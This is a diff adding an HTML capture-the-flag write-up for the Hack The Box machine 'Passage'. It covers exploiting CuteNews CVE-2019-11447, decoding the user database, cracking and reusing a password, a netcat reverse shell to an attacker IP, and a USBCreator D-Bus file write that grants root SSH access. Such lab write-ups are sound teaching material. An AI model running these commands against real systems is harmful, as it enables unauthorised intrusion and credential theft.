@@ -1,0 +1,131 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="static/css/style.css">
+</head>
+
+<body>
+    <aside>
+        <iframe src="nav.html"></iframe>
+    </aside>
+
+    <aside class="index">
+        <h1>page index</h1>
+        <ol>
+            <li><a href="#information">information</a></li>
+            <li><a href="#foothold">foothold</a></li>
+            <li><a href="#user">user</a></li>
+            <li><a href="#root">root</a></li>
+        </ol>
+    </aside>
+
+    <article>
+        <h1>Passage</h1>
+
+        <section id="information">
+            <h2>1. Information</h2>
+            <ul>
+                <li> Linux</li>
+                <li> Medium class</li>
+                <li> Released Sep 2020</li>
+                <li> Retired Mar 2021</li>
+            </ul>
+
+            <p> Passage is a medium-rated box with CuteNews, password cracking and an <span>USBCreator</span> file write
+                exploit.
+            </p>
+        </section>
+        <section id="foothold">
+            <h2>2. Foothold</h2>
+            <p>Scanning with <span>nmap -sC -sV -T4 -v passage.htb -v</span> only gives port 80 to work with, with
+                <span>Apache/2.4.18</span>.
+            </p>
+
+            <p>Entering the website at port 80 gives us some immediate hints: the site uses <a
+                    href="https://cutephp.com/index.php">CuteNews</a>, that Fail2Ban is enabled and there may be a user
+                <span>paul</span> since the <span>mailto</span> address points to <span>paul@passage.htb</span>.
+                Comments seem to be enabled for
+                anonymous users but doesn't immediately provide anything useful.
+            </p>
+
+            <img src="static/img/passage_1.jpg" />
+            <figcaption>Automatic enumeration and bruteforcing is discouraged</figcaption>
+            <p>The CuteNews login page is accessible at <span>/CuteNews</span> which displays the version number, 2.1.2.
+                Searching <span>cutenews 2.1.2 exploit</span> returns CVE-2019-11447, which works and drops a shell as
+                <span>www-data</span>.
+            </p>
+        </section>
+        <section id="user">
+            <h2>3. User</h2>
+            <p>Looking at the CuteNews <a
+                    href="https://github.com/CuteNews/cutenews-2.0/blob/fa18b723f0e81d7be1be15caec80f192a38e3ecc/core/db/coreflat.php">source</a>,
+                we see that the flat database exists in a <span>cdata</span> directory with user information in
+                <span>/cdata/users/</span>. Every user seems to be split into a single file, and there is a file called
+                <span>lines.php</span> which has multiple Base64-encoded rows. Let's exfiltrate and look at it:
+            </p>
+            <code>$ wget http://passage.htb/CuteNews/cdata/users/lines
+$ cat lines | xargs -I{} bash -c 'base64 -d <<< {}' 2>/dev/null</code>
+            <p><span>paul</span>'s user entry is found here, with the password hash. Cracking the hash with CrackStation
+                retrieves <span>atlanta1</span>. Now we can log in to CuteNews as <span>paul-coles</span>, but it
+                doesn't have anything useful in it.</p>
+
+            <p>We might try to <span>su - paul</span> and hope for password reuse, but the restricted shell we get from
+                the <a href="https://www.exploit-db.com/exploits/48800">CVE-2019-11447 POC</a> can't do that. Let's
+                upgrade
+                the shell with <span>nc -lvnp 4444</span> on the attacker and <span>nc 10.10.14.41 -e /bin/sh</span> in
+                the restricted shell.</p>
+            <code>$ nc -lvnp 4444
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+SHELL=/bin/bash script -q /dev/null
+www-data@passage:/var/www/html/CuteNews/uploads$ su - paul
+su - paul
+Password: atlanta1
+
+paul@passage:~$ id
+id
+uid=1001(paul) gid=1001(paul) groups=1001(paul)
+paul@passage:~$</code>
+            <figcaption>Logging in as <span>paul</span></figcaption>
+
+            <p>We now have user access and grab the flag from <span>paul</span>'s directory.</p>
+        </section>
+        <section id="root">
+            <h2>4. Root</h2>
+            <p>Since <span>paul</span> doesn't have any <span>sudo</span> permissions and the <span>nadav</span> user
+                exists on the system, we might try to escalate to <span>nadav</span> first.</p>
+
+            <p><span>paul</span> has an <span>~/.ssh/authorized_keys</span> entry, but it looks like the key belongs to
+                <span>nadav@passage</span>. That means the key used to log in to <span>paul</span> user might give
+                access to <span>nadav</span>.
+                This is confirmed by running <span>ssh nadav@localhost</span>.
+            </p>
+            <code>paul@passage:~$ ssh nadav@localhost
+Last login: Wed Apr  7 00:40:04 2021 from 127.0.0.1
+nadav@passage:~$ id
+uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</code>
+            <figcaption>Logging in as <span>nadav</span></figcaption>
+            <p>Executing <span>sudo</span> commands is still not available, but <span>nadav</span> is part of the
+                <span>sudo</span> group. A <span>.viminfo</span> file in the user's home directory has traces of a
+                <span>vim</span> session detailing that
+                <span>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</span> and
+                <span>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</span> were edited at some point.
+            </p>
+            <p>An online search for <span>USBCreator exploit</span> has
+                a <a
+                    href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">POC
+                    description</a>. If applicable, this would allow us to write arbitrary files as <span>root</span>
+                wherever.</p>
+
+            <p>Let's try copying <span>nadav</span>'s SSH key to <span>root</span>'s <span>authorized_keys</span> this
+                time.
+            </p>
+            <code>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true</code>
+            <p>Now, we can log in to <span>root</span> by executing <span>ssh root@localhost</span> and get the root
+                flag.</p>
+        </section>
+    </article>
+</body>
+
+</html>
